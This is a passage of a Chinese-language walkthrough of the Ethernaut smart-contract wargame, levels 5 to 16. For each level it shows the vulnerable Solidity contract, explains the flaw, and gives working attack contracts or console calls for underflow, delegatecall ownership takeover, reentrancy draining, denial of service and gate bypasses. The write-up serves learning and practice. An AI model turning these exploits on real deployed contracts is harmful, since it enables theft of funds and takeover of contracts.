_initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;= 0);</span><br><span class="line">    balances[msg.sender] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过这道题目的要求是增加 token 的数量，在<code>transfer</code>函数处可以改变 token 的数量，在合约中未使用<code>safemath</code>库，所以在<code>balances[msg.sender] -= _value;</code>处可以造成溢出，调用<code>transfer</code>函数即可。</p><p>由于一开始有20个token，使用<code>transfer</code>函数减去<code>21</code>就会造成溢出。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">contract.transfer(level,<span class="number">21</span>)</span><br></pre></td></tr></table></figure><h3 id="6-Delegation"><a href="#6-Delegation" class="headerlink" title="6. Delegation"></a>6. Delegation</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor(address _owner) public &#123;</span><br><span class="line">    owner = _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  constructor(address _delegateAddress) public &#123;</span><br><span class="line">    delegate = Delegate(_delegateAddress);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external &#123;</span><br><span class="line">    (bool result,) = address(delegate).delegatecall(msg.data);</span><br><span class="line">    if (result) &#123;</span><br><span class="line">      this;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题目要求获得合约的所有权，由于我们无法直接调用<code>pwn()</code>函数，所以只能通过<code>Delegation</code>合约的回掉函数中的<code>delegatecall</code>发起调用，<code>delegatecall</code>的执行环境在合约<code>Delegation</code>中，而 <code>msg.data</code>又是可控的，直接用 <code>bytes4(keccak256(&quot;pwn()&quot;))</code> 即可通过 <code>delegatecall()</code> 将已部署的 Delegation <code>owner</code> 修改为攻击者自己（msg.sender)。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">contract.sendTransaction(&#123;<span class="attr">data</span>: web3.utils.sha3(<span class="string">&quot;pwn()&quot;</span>).slice(<span class="number">0</span>,<span class="number">10</span>)&#125;);</span><br></pre></td></tr></table></figure><p>以下是俩种调用方式的区别：</p><p><img src="/image/Ethernaut.assets/image-20220902101423276.png" alt="image-20220902101423276"></p><h3 id="7-Force"><a href="#7-Force" class="headerlink" title="7. Force"></a>7. Force</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123;/*</span><br><span class="line"></span><br><span class="line">                   MEOW ?</span><br><span class="line">         /\_/\   /</span><br><span class="line">    ____/ o o \</span><br><span class="line">  /~____  =ø= /</span><br><span class="line"> (______)__m_m)</span><br><span class="line"></span><br><span class="line">*/&#125;</span><br></pre></td></tr></table></figure><p>这道题目要求合约中的余额大于0。使用<code>selfdestruct</code>方法就可以强制将合约中的余额转入某个账户。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">   constructor() payable public &#123;</span><br><span class="line">       require(msg.value &gt; 0);</span><br><span class="line">   &#125;</span><br><span class="line">    </span><br><span class="line">  function exploit(address payable _target) public payable &#123;</span><br><span class="line">      selfdestruct(_target);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-Vault"><a href="#8-Vault" class="headerlink" title="8. Vault"></a>8. Vault</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32 _password) public &#123;</span><br><span class="line">    locked = true;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function unlock(bytes32 _password) public &#123;</span><br><span class="line">    if (password == _password) &#123;</span><br><span class="line">      locked = false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题要求打开valult，调用<code>unlock</code>可以进行解锁，但是需要 <code>password</code>，利用 web3py 可以获取到 password 的值</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3, EthereumTesterProvider</span><br><span class="line"></span><br><span class="line">web = Web3(Web3.HTTPProvider(<span class="string">&#x27;https://rinkeby.infura.io/v3/&#x27;</span>))</span><br><span class="line">checkConnect = web.isConnected()</span><br><span class="line">web3 = web.eth</span><br><span class="line"></span><br><span class="line">address = <span class="string">&quot;0xCe21072C0010feF4CB6C03F8FC03E944e39Ee17B&quot;</span></span><br><span class="line"><span class="built_in">print</span>(Web3.toText(web3.get_storage_at(address, <span class="number">1</span>)))</span><br><span class="line"><span class="built_in">print</span>(Web3.toHex(web3.get_storage_at(address, <span class="number">1</span>)))</span><br><span class="line"><span class="comment">#A very strong secret password :)</span></span><br><span class="line"><span class="comment">#0x412076657279207374726f6e67207365637265742070617373776f7264203a29</span></span><br></pre></td></tr></table></figure><p>然后调用<code>unlock</code>函数即可，由于web3.js不能自动把string解析成byte32类型，所以将 bytes 类型的 <code>password</code>作为参数传入。</p><h3 id="9-King"><a href="#9-King" class="headerlink" title="9. King"></a>9. King</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line"></span><br><span class="line">  address payable king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public payable &#123;</span><br><span class="line">    owner = msg.sender;  </span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    king.transfer(msg.value);</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function _king() public view returns (address payable) &#123;</span><br><span class="line">    return king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该合约表示了一个很简单的游戏: 任何一个发送了高于目前价格的人将成为新的国王. 在这个情况下, 上一个国王将会获得新的出价。阻止其他人重获王位来通过这一关。</p><p>在<code>receive</code>函数中可以接收 prize，当prize 大于当前的 king 的prize时就会成为king，如果要阻止其他人成为king，可以在fallback 或者 receive 函数中写入 <code>revert()</code>，使<code>king.transfer(msg.value)</code>失败。</p><p><img src="/image/Ethernaut.assets/image-20220903131148062.png" alt="image-20220903131148062"></p><p>在创建后的第一个king 的prize 为 0.001 ether，只要发送大于 0.001的 ether即可</p><p>攻击合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Exploit &#123;</span><br><span class="line">    constructor(address payable _King) payable public &#123;</span><br><span class="line">        _King.call.value(1 ether).gas(1000000)(&quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    fallback() payable external&#123;</span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-Re-entrancy"><a href="#10-Re-entrancy" class="headerlink" title="10. Re-entrancy"></a>10. Re-entrancy</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] = balances[_to].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class="line">      if(result) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题考查的重入漏洞，由于在<code>withdraw</code>函数中，首先进行转账操作，然后才将对应账户的余额减去。而且这里的转账利用了<code>call</code>方法，没有 gas 的限制，使用 <code>call</code>进行转账时 EVM 将所有的 gas都用来进行转账。</p><p>solidity 中还有其他俩种转账方式：</p><ul><li><p><strong>transfer：</strong></p><p>要求接收的智能合约中必须有一个<code>fallback</code>或者<code>receive</code>函数，否则会抛出一个错误(error)，并且revert。而且有单笔交易中的操作总gas不能超过2300的限制。transfer 还会在以下俩种情况下抛出错误：</p><ul><li>付款方合约的余额不足，小于所要发送的value</li><li>接收方合约拒绝接收支付</li></ul></li><li><p><strong>send：</strong></p><p>和transfer函数的工作方式基本一样，唯一的区别在于，当出现上述两种交易失败的情况时，send的返回结果是一个boolean值，而不会执行revert回滚。</p></li></ul><p>我们只需要在<code>fallback</code>中重复调用<code>withdraw    </code>函数即可将合约中所有的余额转出：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Exploit &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    IReentrance target;</span><br><span class="line">    uint targetValue = 1000000000000000 wei;</span><br><span class="line"></span><br><span class="line">    constructor(address _targetAddr) public&#123;</span><br><span class="line">        target = IReentrance(_targetAddr);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function donateAndWithdraw() public payable&#123;</span><br><span class="line">        require(msg.value &gt;= targetValue);</span><br><span class="line">        target.donate.value(msg.value)(address(this));</span><br><span class="line">        target.withdraw(msg.value);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        target.withdraw(targetValue);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="11-Elevtor"><a href="#11-Elevtor" class="headerlink" title="11. Elevtor"></a>11. Elevtor</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">  function isLastFloor(uint) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  function goTo(uint _floor) public &#123;</span><br><span class="line">    Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">    if (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor = _floor;</span><br><span class="line">      top = building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题目要求到达电梯楼层，而<code>Building</code>是一个接口，类似抽象类，而<code>isLastFloor</code>类似一个抽象函数，因此可以自己设计这个函数的内容。题目中的要求是<code>top=true</code>，但在题目中要进入 if 分支，<code> building.isLastFloor(_floor)==false</code>，而top又等于<code>building.isLastFloor(_floor)</code>，所以可以将<code>isLastFloor</code>设置为针对同一个变量的取反函数，第一次调用返回 false，第二次调用返回 true即可满足题目条件。</p><p>攻击合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface Elevator &#123;</span><br><span class="line">  function goTo(uint _floor) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Building &#123;</span><br><span class="line">bool floor = true;</span><br><span class="line">address target;</span><br><span class="line">Elevator elevator;</span><br><span class="line">function isLastFloor(uint) external returns (bool) &#123;</span><br><span class="line">floor = !floor;</span><br><span class="line">return floor;</span><br><span class="line">&#125;</span><br><span class="line">function exploit(address _addr) public &#123;</span><br><span class="line">elevator = Elevator(_addr);</span><br><span class="line">elevator.goTo(1);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="12-Privacy"><a href="#12-Privacy" class="headerlink" title="12. Privacy"></a>12. Privacy</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line"></span><br><span class="line">  bool public locked = true;</span><br><span class="line">  uint256 public ID = block.timestamp;</span><br><span class="line">  uint8 private flattening = 10;</span><br><span class="line">  uint8 private denomination = 255;</span><br><span class="line">  uint16 private awkwardness = uint16(now);</span><br><span class="line">  bytes32[3] private data;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32[3] memory _data) public &#123;</span><br><span class="line">    data = _data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function unlock(bytes16 _key) public &#123;</span><br><span class="line">    require(_key == bytes16(data[2]));</span><br><span class="line">    locked = false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">    A bunch of super advanced solidity algorithms...</span><br><span class="line"></span><br><span class="line">      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`</span><br><span class="line">      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,</span><br><span class="line">      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\</span><br><span class="line">      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)</span><br><span class="line">      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU</span><br><span class="line">  */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题要求我们输入data数组的第二个元素的前16个字节即可，考察以太坊中状态变量的内存分布。</p><p>该合约的内存布局为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">======================================================    </span><br><span class="line">     unused (31 bytes)  | locked (1 byte)                    slot 0</span><br><span class="line">======================================================</span><br><span class="line">    ID(32 bytes)            slot 1  </span><br><span class="line">======================================================</span><br><span class="line">unused |awkwardness(2)|denomination(1)|flattening(1)         slot 2</span><br><span class="line">======================================================</span><br><span class="line">data[0] 32 bytes                                 slot 3</span><br><span class="line">======================================================</span><br><span class="line">data[1] 32 bytes         slot 4</span><br><span class="line">======================================================</span><br><span class="line">data[2] 32 bytes                                 slot 5</span><br><span class="line">======================================================</span><br></pre></td></tr></table></figure><p>利用 web3py 读出数组 <code>data[2]</code>的内容：</p><h3 id="13-Gatekeeper-One"><a href="#13-Gatekeeper-One" class="headerlink" title="13. Gatekeeper One"></a>13. Gatekeeper One</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    require(gasleft().mod(8191) == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(tx.origin), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题目要求通过三个<code>gate</code>，第一个与第四关类似，表示发起交易的账户必须是合约账户，不是用户账户， 可以通过部署一个合约，在合约中调用即可；第二个gate要求交易剩余的gas量必须是 8191 的倍数，只需要设置 <code>gas = 8191 *n + x</code>，x表示本次交易需要消耗的gas，可以对 x 进行爆破；第三个gate主要考察 solidity 的类型转换。</p><p>以 <code>_gateKey = 0x12345678eadbeef_</code>为例：</p><ul><li><code>uint32(uint64(_gateKey))</code>转换后会取低位，所以转换后的值为<code>0xdeadbeef</code>，<code>uint16(uint64(_gateKey))</code>也会被转为<code>0xbeef</code>，uint16 和 uin32做比较时，较小的类型 uint16 会在高位填充 0，即填充为<code>0x0000beef</code>进行比较，因此通过第一个 require 就要求<code>_gateKey</code>形为<code>0x********0000****</code>即可；</li><li>第二个 require 要求俩边不相等，只需要高 4 字节中有任何一个bit不为0即可；</li><li>由第一个require可以知道<code>uint32(uint64(_gateKey))</code>应该是类似<code>0x0000beef</code>这种形式，所以需要让最低的2个字节和<code>tx.orign</code>地址里最低的2个字节相同，即_gateKey的最低2个字节设置为合约地址的低2个字节。这里tx.origin就是metamask的账户地址。</li></ul><p>攻击合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface GatekeeperOne &#123;</span><br><span class="line">    function entrant() external returns (address);</span><br><span class="line">    function enter(bytes8 _gateKey) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attack &#123;</span><br><span class="line">    GatekeeperOne gatekeeperOne;</span><br><span class="line">    address target;</span><br><span class="line">    address entrant;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    constructor(address _addr) public &#123;</span><br><span class="line">        // 设置为题目地址</span><br><span class="line">        target = _addr;</span><br><span class="line">    &#125;</span><br><span class="line">    function exploit() public &#123;</span><br><span class="line">        // 后四位是metamask上账户地址的低2个字节</span><br><span class="line">        bytes8 key=0xAAAAAAAA0000c7e5;</span><br><span class="line">        bool result;</span><br><span class="line">        for (uint256 i = 0; i &lt; 120; i++) &#123;</span><br><span class="line">            (bool result, bytes memory data) = address(target).call.gas(i+150+8191*3)(abi.encodeWithSignature(&quot;enter(bytes8)&quot;,key));</span><br><span class="line">            if (result) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getentrant() public &#123;</span><br><span class="line">        gatekeeperOne = GatekeeperOne(target);</span><br><span class="line">        entrant = gatekeeperOne.entrant();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="14-Gatekeeper-Two"><a href="#14-Gatekeeper-Two" class="headerlink" title="14. Gatekeeper Two"></a>14. Gatekeeper Two</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; x := extcodesize(caller()) &#125;</span><br><span class="line">    require(x == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>这道题目中的<code>gateOne</code>与上一次相同，部署一个合约在合约中调用即可；</p></li><li><p><code>gateTwo</code>涉及到汇编语言，<strong>extcodesize</strong>表示返回对应地址的合约代码的大小，其中 <code>caller()</code>返回的是<code>call sender</code>即调用的发起者，如果<code>extcodesize</code>的参数是用户地址则会返回0，是合约地址则返回了调用合约的代码大小。<code>extcodesize</code>具有一个特性：当合约处于部署阶段时，<code>extcodesize</code>的值为 0，如果我们在<code>constructor</code>中调用这个函数的话，那么<code>extcodesize(caller())</code>返回0，因此可以绕过检查。</p></li><li><p><code>gateThree</code>是一个异或，所以可以知道<code>_gateKey)=bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0)-1))</code></p></li></ul><p>攻击合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract attack &#123;</span><br><span class="line">    address public target;</span><br><span class="line">    bytes8 key;</span><br><span class="line"></span><br><span class="line">    constructor(address _addr) public &#123;</span><br><span class="line">        target=_addr;</span><br><span class="line">        key=bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0)-1));</span><br><span class="line">        (bool result,)=target.call(abi.encodeWithSignature(&quot;enter(bytes8)&quot;,key));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="15-Naugth-Coin"><a href="#15-Naugth-Coin" class="headerlink" title="15. Naugth Coin"></a>15. Naugth Coin</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/token/ERC20/ERC20.sol&#x27;;</span><br><span class="line"></span><br><span class="line"> contract NaughtCoin is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">  // string public constant name = &#x27;NaughtCoin&#x27;;</span><br><span class="line">  // string public constant symbol = &#x27;0x0&#x27;;</span><br><span class="line">  // uint public constant decimals = 18;</span><br><span class="line">  uint public timeLock = now + 10 * 365 days;</span><br><span class="line">  uint256 public INITIAL_SUPPLY;</span><br><span class="line">  address public player;</span><br><span class="line"></span><br><span class="line">  constructor(address _player) </span><br><span class="line">  ERC20(&#x27;NaughtCoin&#x27;, &#x27;0x0&#x27;)</span><br><span class="line">  public &#123;</span><br><span class="line">    player = _player;</span><br><span class="line">    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));</span><br><span class="line">    // _totalSupply = INITIAL_SUPPLY;</span><br><span class="line">    // _balances[player] = INITIAL_SUPPLY;</span><br><span class="line">    _mint(player, INITIAL_SUPPLY);</span><br><span class="line">    emit Transfer(address(0), player, INITIAL_SUPPLY);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;</span><br><span class="line">    super.transfer(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // Prevent the initial owner from transferring tokens until the timelock has passed</span><br><span class="line">  modifier lockTokens() &#123;</span><br><span class="line">    if (msg.sender == player) &#123;</span><br><span class="line">      require(now &gt; timeLock);</span><br><span class="line">      _;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这道题要求将题目中的所有token转出，但是题目中对 <code>transfer</code>函数作出了限制，<code>player</code>只有在10年后才可以进行转账操作，但是因为只限制了<code>transfer</code>函数的<code>msg.sender</code>不能为<code>player</code>，但在 ERC20 中还有另一个转账函数<code>transferFrom</code>:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">        address spender = _msgSender();</span><br><span class="line">        _spendAllowance(from, spender, amount);</span><br><span class="line">        _transfer(from, to, amount);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在转账前需要先使用<code>approve</code>函数进行授权，然后再调用次函数进行转账。</p><p>解题步骤：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">value = <span class="string">&#x27;1000000000000000000000000&#x27;</span></span><br><span class="line"><span class="comment">//授权</span></span><br><span class="line"><span class="keyword">await</span> contract.approve(player,value)</span><br><span class="line"><span class="comment">//转账到任意地址</span></span><br><span class="line"><span class="keyword">await</span> contract.transferFrom(player,<span class="string">&#x27;other address&#x27;</span>,value)</span><br></pre></td></tr></table></figure><h3 id="16-Preservation"><a href="#16-Preservation" class="headerlink" title="16. Preservation"></a>16. Preservation</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line"></span><br><span class="line">  // public library contracts </span><br><span class="line">  address public timeZone1Library;</span><br><span class="line">  address public timeZone2Library;</span><br><span class="line">  address public owner; </span><br><span class="line">  uint storedTime;</span><br><span class="line">  // Sets the function signature for delegatecall</span><br><span class="line">  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));</span><br><span class="line"></span><br><span class="line">  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;</span><br><span class="line">    timeZone1Library = _timeZone1LibraryAddress; </span><br><span class="line">    timeZone2Library = _timeZone2LibraryAddress; </span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  // set the time for timezone 1</span><br><span class="line">  function setFirstTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // set the time for timezone 2</span><br><span class="line">  function setSecondTime(uint _timeStamp) public &#123;</span><br><span class="line">    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Simple library contract to set the time</span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line"></span><br><span class="line">  // stores a timestamp </span><br><span class="line">  uint storedTime;  </span><br><span class="line"></span><br><span class="line">  function setTime(uint _time) public &#123;</span><br><span class="line">    storedTime = _time;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完成该题目的要求是成为合约的 owner，而成为 owner 的要点就在于<code>delegatecall</code>，Preservation 合约中的俩个函数中的<code>delegatecall</code>调用的都是<code>setTime </code>函数，这个函数可以修改全局变量中的    <code>storagedTime</code>变量。</p><p>对于 Preservation 合约的存储布局如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span 